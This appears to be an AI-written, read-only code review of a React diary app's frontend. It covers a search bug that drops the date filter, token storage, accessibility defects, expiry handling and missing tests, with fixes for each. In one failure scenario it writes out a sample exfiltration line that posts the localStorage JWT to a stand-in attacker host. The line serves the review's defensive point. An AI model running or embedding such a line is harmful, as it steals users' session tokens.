# Frontend Code Review — sample_project_FE

## Scope

Full read of the frontend at `sample_project_FE` (excluding `node_modules/` and `dist/`). I also cross-checked the backend API contract (`DiaryController`, `JwtService`, `RegisterRequest`, `DiaryEntryRequest`) to verify the frontend's assumptions.

Files read:

- Config / root: `.env`, `.env.example`, `.gitignore`, `.oxlintrc.json`, `index.html`, `package.json`, `tsconfig.json`, `tsconfig.app.json`, `tsconfig.node.json`, `vite.config.ts`
- Assets: `public/favicon.svg`, `public/icons.svg`
- Entry: `src/main.tsx`, `src/App.tsx`, `src/index.css`
- API: `src/api/axios.ts`, `src/api/authApi.ts`, `src/api/diaryApi.ts`
- Types: `src/types/api.ts`
- Utils: `src/utils/cn.ts`, `src/utils/date.ts`, `src/utils/errors.ts`, `src/utils/jwt.ts`, `src/utils/text.ts`
- Context: `src/context/authContext.ts`, `src/context/AuthProvider.tsx`, `src/context/toastContext.ts`, `src/context/ToastProvider.tsx`
- Hooks: `src/hooks/useAuth.ts`, `src/hooks/useToast.ts`, `src/hooks/useDebouncedValue.ts`, `src/hooks/useDiaries.ts`
- Routes: `src/routes/AppRoutes.tsx`, `src/routes/ProtectedRoute.tsx`, `src/routes/PublicOnlyRoute.tsx`
- Pages: `src/pages/Login.tsx`, `src/pages/Register.tsx`, `src/pages/Dashboard.tsx`, `src/pages/DiaryEntryPage.tsx`, `src/pages/CreateDiary.tsx`, `src/pages/EditDiary.tsx`, `src/pages/NotFound.tsx`
- Components: `src/components/auth/AuthCard.tsx`; `src/components/common/{Button,TextField,TextArea,PasswordField,ConfirmDialog,Pagination,EmptyState,ErrorState,Skeleton,ToastViewport}.tsx`; `src/components/diary/{DiaryCard,DiaryFilters,DiaryForm,DiaryListSkeleton}.tsx`; `src/components/layout/{AppLayout,Header}.tsx`

I did not run `tsc -b`, `vite build` or `oxlint` — those mutate the working tree (build info, `dist/`), and this review is read-only. All findings below come from reading the source.

**No Critical findings.** This is a clean, well-structured codebase: no `any`, no `dangerouslySetInnerHTML`, no hand-rolled URL interpolation into markup, DTO types centralised in `src/types/api.ts`, and consistent layering (api → hooks → pages → components).

---

## Major

### 1. `src/hooks/useDiaries.ts:25` — the date range is silently discarded whenever a search keyword is present

`useDiaryList` branches on `isSearching`; in that branch it calls `diaryApi.searchDiaries({ keyword, page, size })` and drops `from`/`to` entirely. The backend confirms this is unavoidable at the API level — `GET /api/diaries/search` (`DiaryController.java:81-89`) accepts only `keyword`, `page` and `size`. The UI never tells the user.

**Failure scenario:** a user opens the Date filter, applies `from = 2026-01-01 / to = 2026-01-31`, then types "holiday" into the search box. The `Date filter` button stays in the `primary` (active) variant and the applied range is still shown in the date form, but results come back from every date in the diary. The user reasonably concludes their January entry was deleted, or that search is broken.

**Suggested fix** — make the exclusion explicit in the UI, and keep the state honest. Either disable the range while searching:

```tsx
// DiaryFilters.tsx — new prop `disabledReason`
<Button
  variant={showDates || hasRange ? 'primary' : 'secondary'}
  onClick={() => setShowDates((c) => !c)}
  disabled={isSearching}
  title={isSearching ? 'Date filters do not apply to search results' : undefined}
  aria-expanded={showDates}
>
```

…or, better, clear the range when a keyword is entered so the visible state matches the request:

```tsx
// Dashboard.tsx
const changeSearch = (value: string) => {
  setSearch(value)
  if (value.trim() !== '') setRange(EMPTY_RANGE)   // search ignores the range server-side
  setPage(0)
}
```

Whichever you pick, add a one-line note in the results header ("Date filters don't apply to search") so the behaviour is discoverable.

### 2. `src/api/axios.ts:8-23` — the JWT lives in `localStorage`, readable by any script on the origin

`getStoredToken` / `setStoredToken` persist the bearer token under `diary.token` in `localStorage`. Any XSS on the origin — a compromised npm dependency in the bundle, a malicious browser extension with script access, or a future feature that renders untrusted HTML — can read the token and exfiltrate it. The token is also long-lived (the backend issues a single access token with no refresh/rotation, `JwtService.generateToken`), so a single theft yields full account access until natural expiry, with no server-side revocation path.

**Failure scenario:** a transitively-compromised dependency runs `fetch('https://attacker/', {method:'POST', body: localStorage.getItem('diary.token')})` at import time. The attacker then reads, edits and deletes every diary entry of every user who loaded the app, and nothing in the app or the backend can invalidate the stolen token.

This is an architectural decision that also touches the backend, so it may be out of scope for a frontend-only change. At minimum, document the trade-off. The durable fix is an httpOnly, `Secure`, `SameSite=Strict` cookie for a refresh token plus a short-lived in-memory access token:

```ts
// axios.ts — access token in module scope only; nothing persisted
let accessToken: string | null = null
export const setAccessToken = (t: string | null) => { accessToken = t }
export const getAccessToken = () => accessToken

api.interceptors.request.use((config) => {
  if (accessToken) config.headers.Authorization = `Bearer ${accessToken}`
  return config
})
// on 401 → POST /api/auth/refresh (httpOnly cookie) → retry once → else sign out
```

If `localStorage` must stay for now, shorten the backend token lifetime materially and add a Content-Security-Policy meta/header to `index.html` to reduce the blast radius of an injection.

---

## Minor

### 3. `src/components/common/ConfirmDialog.tsx:44` — hard-coded `id="confirm-dialog-title"` is duplicated whenever two dialogs are mounted

Every `ConfirmDialog` renders `<h2 id="confirm-dialog-title">` and points `aria-labelledby` at that literal. On `/dashboard` two instances are mounted simultaneously: the logout dialog in `AppLayout.tsx:34` and the delete-entry dialog in `Dashboard.tsx:180`. Both are in the DOM even when closed (a `<dialog>` without `open` is merely hidden, not unmounted).

**Failure scenario:** a screen-reader user clicks the trash icon on an entry. The delete dialog opens, but `document.getElementById('confirm-dialog-title')` resolves to the *first* match in document order — the `AppLayout` logout dialog's heading — so the modal is announced as "Sign out?" while offering a "Delete" button.

**Suggested fix** — generate the id per instance, and wire up the description too:

```tsx
import { useEffect, useId, useRef, type ReactNode } from 'react'
// …
const titleId = useId()
const descId = useId()
// …
<dialog ref={dialogRef} aria-labelledby={titleId} aria-describedby={descId} …>
  <div className="space-y-3 p-6">
    <h2 id={titleId} className="font-serif text-lg text-ink">{title}</h2>
    <div id={descId} className="text-sm leading-6 text-muted">{description}</div>
  </div>
```

### 4. `src/components/common/ToastViewport.tsx:11` — the `aria-live` region is created at the same moment as its content, so announcements are missed

`if (toasts.length === 0) return null` means the `aria-live="polite"` container is inserted into the DOM together with the first toast. Assistive technology only observes mutations *inside* a live region that already existed; a region added with content already in it is typically not announced.

**Failure scenario:** a screen-reader user deletes an entry. `showToast('Entry deleted.')` fires, the whole live region mounts with the toast inside, and nothing is spoken — the user has no confirmation the delete succeeded (the card also disappears silently after the list invalidates).

**Suggested fix** — keep the region permanently mounted and vary only its children:

```tsx
export function ToastViewport({ toasts, onDismiss }: ToastViewportProps) {
  return (
    <div
      aria-live="polite"
      aria-atomic="false"
      className={cn(
        'pointer-events-none fixed inset-x-4 bottom-4 z-50 flex flex-col items-center gap-2 sm:inset-x-auto sm:right-6 sm:bottom-6 sm:items-end',
        toasts.length === 0 && 'sr-only',
      )}
    >
      {toasts.map((toast) => ( /* unchanged */ ))}
    </div>
  )
}
```

### 5. `src/context/AuthProvider.tsx:31` — token expiry is evaluated only when the token value changes, so the UI stays "signed in" after expiry

`user` is `useMemo(() => userFromToken(token), [token])`. `isTokenExpired` is therefore consulted at mount and at login, never again. There is no timer and no `exp`-driven scheduled sign-out.

**Failure scenario:** a user leaves the dashboard open overnight and the token expires. `isAuthenticated` is still `true`, so `ProtectedRoute` lets them navigate to `/diary/new`; they write a long entry and press Save. Only then does the request return 401, the interceptor fires `UNAUTHORIZED_EVENT`, `logout()` runs, `queryClient.clear()` wipes the cache and they are bounced to `/login` — the unsaved entry is gone.

**Suggested fix** — schedule the sign-out from the token's own `exp`:

```tsx
useEffect(() => {
  if (!token) return
  const payload = decodeToken(token)
  if (typeof payload?.exp !== 'number') return
  const msLeft = payload.exp * 1000 - Date.now()
  if (msLeft <= 0) { logout(); return }
  const timer = window.setTimeout(logout, Math.min(msLeft, 2_147_483_647))
  return () => window.clearTimeout(timer)
}, [token, logout])
```

Pair it with draft preservation in `DiaryForm` if you want to fully close the data-loss path.

### 6. `src/context/AuthProvider.tsx:40-43` — auth state does not sync across tabs

The provider listens only for the in-page `UNAUTHORIZED_EVENT`. `localStorage` writes from another tab raise a `storage` event that nothing subscribes to.

**Failure scenario:** a user signs out on a shared machine in tab A. Tab B, still open on `/dashboard`, keeps rendering the previous user's cached entries (TanStack Query serves the cached page for 30 s of `staleTime`, and `refetchOnWindowFocus` is off) until they happen to trigger a request that 401s. On a shared computer this leaves another person's diary on screen after a deliberate sign-out.

**Suggested fix:**

```tsx
useEffect(() => {
  const onStorage = (event: StorageEvent) => {
    if (event.key !== 'diary.token') return
    if (event.newValue === null) logout()
    else setToken(event.newValue)
  }
  window.addEventListener('storage', onStorage)
  return () => window.removeEventListener('storage', onStorage)
}, [logout])
```

(Export the `'diary.token'` key from `api/axios.ts` rather than repeating the literal.)

### 7. `src/App.tsx:23` — no error boundary anywhere in the tree

Nothing wraps `AppRoutes`, and the router uses the `<Routes>` component API rather than a data router with `errorElement`.

**Failure scenario:** the backend returns a `DiaryEntry` with `content: null` (a nullable column, a partially-migrated row, an older API version). `preview(entry.content)` in `DiaryCard.tsx:24` throws on `null.replace`, React unmounts the entire tree, and the user gets a blank white page with no way to recover except a manual reload.

**Suggested fix** — add a boundary around the routes with a reload affordance:

```tsx
<QueryClientProvider client={queryClient}>
  <BrowserRouter>
    <ToastProvider>
      <AuthProvider>
        <RootErrorBoundary>   {/* class component with componentDidCatch */}
          <AppRoutes />
        </RootErrorBoundary>
      </AuthProvider>
    </ToastProvider>
  </BrowserRouter>
</QueryClientProvider>
```

`ErrorState` already exists and makes a good fallback render.

### 8. `src/context/ToastProvider.tsx:19` — the auto-dismiss timer is never cleared

`window.setTimeout(() => dismissToast(id), AUTO_DISMISS_MS)` is fired and forgotten; the handle is not stored and nothing cancels it on unmount or on manual dismissal.

**Failure scenario:** a user dismisses a toast manually at 200 ms; the timer still runs to 4000 ms and calls `setToasts` with a filter that matches nothing — a wasted render. Across a session with many toasts this accumulates pending timers, and on unmount (e.g. in a test harness or an HMR reload) they fire against a torn-down provider.

**Suggested fix** — track handles and clear them:

```tsx
const timers = useRef(new Map<number, number>())

const dismissToast = useCallback((id: number) => {
  const handle = timers.current.get(id)
  if (handle !== undefined) { window.clearTimeout(handle); timers.current.delete(id) }
  setToasts((current) => current.filter((toast) => toast.id !== id))
}, [])

useEffect(() => () => { timers.current.forEach(window.clearTimeout); timers.current.clear() }, [])
```

and register the handle in `showToast`.

### 9. `.gitignore` — `.env` is not ignored, only `.env.local` and `.env.*.local`

`.env` currently exists on disk (untracked) and holds nothing sensitive — `VITE_API_BASE_URL=/api` and a localhost proxy target. But the ignore list has a gap, and `.env` is exactly the file that accrues secrets.

**Failure scenario:** someone adds `VITE_SENTRY_DSN` or an analytics key to `.env`, runs `git add -A`, and commits the credential to a repo whose history is permanent. The `.env.example` file already documents the intended shape, so tracking `.env` itself has no upside.

**Suggested fix:**

```gitignore
# Local environment
.env
.env.local
.env.*.local
```

(Keep `.env.example` tracked — `git add -f` if needed.)

### 10. `src/utils/errors.ts:47` and `public/icons.svg` — dead code and a leftover template asset

`getFieldErrors` is exported but has no callers anywhere in `src/` (forms surface server validation through `getErrorMessage`, which already joins `data.errors`). `public/icons.svg` is a tracked 5 KB sprite of Bluesky/social icons from a starter template, referenced by no `.tsx`, `.ts`, `.css` or `.html` file.

**Failure scenario:** not a runtime failure — but `getFieldErrors` is the kind of unused helper a future contributor will wire in expecting it to work, and `icons.svg` ships to every deployment and invites the question "which component uses this?".

**Suggested fix:** delete `getFieldErrors` (git history keeps it) — or, if the intent was per-field server errors, actually use it, e.g. in `Register.tsx`:

```tsx
} catch (error) {
  const fields = getFieldErrors(error)
  for (const [name, message] of Object.entries(fields)) {
    if (name in ({} as RegisterValues)) setError(name as keyof RegisterValues, { message })
  }
  setFormError(getErrorMessage(error, 'Unable to create your account. Please try again.'))
}
```

And remove `public/icons.svg`.

### 11. No tests, and no test runner configured

`package.json` has `dev`, `build`, `lint`, `preview` — no `test` script, and neither Vitest nor Testing Library is a dependency. There are no `*.test.ts(x)` files under `src/`.

**Failure scenario:** the security-relevant paths have no regression net. A refactor that inverts the condition in `ProtectedRoute.tsx:9`, or drops the `!url.includes('/auth/')` guard in `axios.ts:42` (which is what keeps a failed login from nuking an existing session), would ship silently. Same for `decodeToken` against a malformed or non-ASCII token, and `isTokenExpired` at the boundary.

**Suggested fix** — add Vitest + Testing Library and cover the auth edges first:

```jsonc
// package.json
"scripts": { "test": "vitest run", "test:watch": "vitest" }
```

```ts
// src/utils/jwt.test.ts
it('rejects a token whose exp has passed', () => {
  expect(isTokenExpired({ sub: 'a', uid: '1', exp: Math.floor(Date.now() / 1000) - 1 })).toBe(true)
})
it('returns null for a malformed payload segment', () => {
  expect(decodeToken('header.@@@not-base64@@@.sig')).toBeNull()
})
```

Then `ProtectedRoute` redirect behaviour, and the 401 interceptor's `/auth/` exemption.

---

## Nit

### 12. `src/pages/Dashboard.tsx:167` — the highlighted page number lags a page behind during navigation

`Pagination` is fed `page={data.page}` (the server's echo) while the query is driven by the local `page` state. With `placeholderData: keepPreviousData`, clicking "Next" keeps the previous response on screen — including its `page` — so the active page pill stays on the old number for the duration of the fetch. Passing the local `page` instead makes the control feel immediate:

```tsx
<Pagination page={page} totalPages={data.totalPages} … />
```

### 13. `src/components/diary/DiaryFilters.tsx:78` — the Apply button spins for unrelated refetches

`isLoading={isFetching && hasRange}` is true for *any* in-flight list request once a range is applied — including a keystroke-triggered search or a post-delete invalidation. The button then shows a spinner and goes disabled while the user is trying to adjust dates. Scope it to the range request, e.g. by comparing `draft` to the applied `range`, or drop `isLoading` here and rely on the list's own dimming.

### 14. `src/pages/Register.tsx:22` — `z.string().email()` is the deprecated Zod 4 spelling, and the 255-char email cap isn't mirrored

The project is on `zod@^4.6.5`, where the top-level `z.email()` is the supported form and the `.email()` string method is deprecated. The backend also enforces `@Size(max = 255)` on email (`RegisterRequest.java:18`), which the schema omits — an over-long address round-trips to the server just to come back as a 400.

```ts
email: z.email('Please enter a valid email address.').trim().max(255, 'Email must not exceed 255 characters.'),
```

### 15. `src/pages/Login.tsx:42` — the post-login redirect drops `search` and `hash`

`redirectTo` reads only `from.pathname`. A user who was deep-linked to `/dashboard?page=3` and got bounced to login lands back on `/dashboard` with the query gone. `ProtectedRoute` already stores the whole `location` object, so the information is available:

```tsx
const from = (location.state as LocationState | null)?.from
const redirectTo = from ? `${from.pathname ?? '/dashboard'}${from.search ?? ''}${from.hash ?? ''}` : '/dashboard'
```

(widen `LocationState` accordingly).

### 16. `public/favicon.svg` — a purple lightning-bolt template icon on an app branded "My Diary"

The favicon is the starter-template mark; `AuthCard` and `Header` both use a `BookOpen` glyph for the product. Worth swapping for consistency with `index.html`'s `<title>My Diary</title>`.

### 17. `src/types/api.ts:59-64` — `tokenType` and `expiresIn` are typed but never read

`AuthProvider` hard-codes the `Bearer ` prefix in the axios interceptor and derives expiry from the JWT's own `exp` rather than `expiresIn`. That's defensible (the `exp` claim is authoritative), but honouring `tokenType` in the interceptor would remove a silent coupling to the backend's current choice.

### 18. `src/components/diary/DiaryFilters.tsx:121` — `type="search"` renders a second, native clear button in some browsers

The custom `X` button at line 130 sits alongside WebKit's built-in `search-cancel-button`, giving two clear affordances in the same corner on Safari/Chrome. Either suppress the native one (`[&::-webkit-search-cancel-button]:appearance-none`) or drop the custom button.

---

## Verdict

This is a carefully built frontend — strict TypeScript with `noUncheckedIndexedAccess`, zero `any`, centralised API types that genuinely match the backend DTOs, clean api/hooks/pages layering, and better-than-typical accessibility instincts (labelled fields, `role="alert"`, `useId`, reduced-motion handling, native `<dialog>` for focus trapping). Nothing here is exploitable as written, and there are no Critical findings.

Two things should be addressed before merge: the date range being silently dropped during search (#1) is a user-visible correctness bug with a cheap fix, and the `localStorage` token (#2) deserves an explicit, documented decision even if the architectural fix lands later. The three accessibility defects (#3, #4) and the missing expiry watchdog (#5) are quick, high-value follow-ups. The absence of any test suite (#11) is the biggest long-term risk: the auth edges — the `/auth/` exemption in the 401 interceptor especially — are precisely the code that will break silently under refactoring.
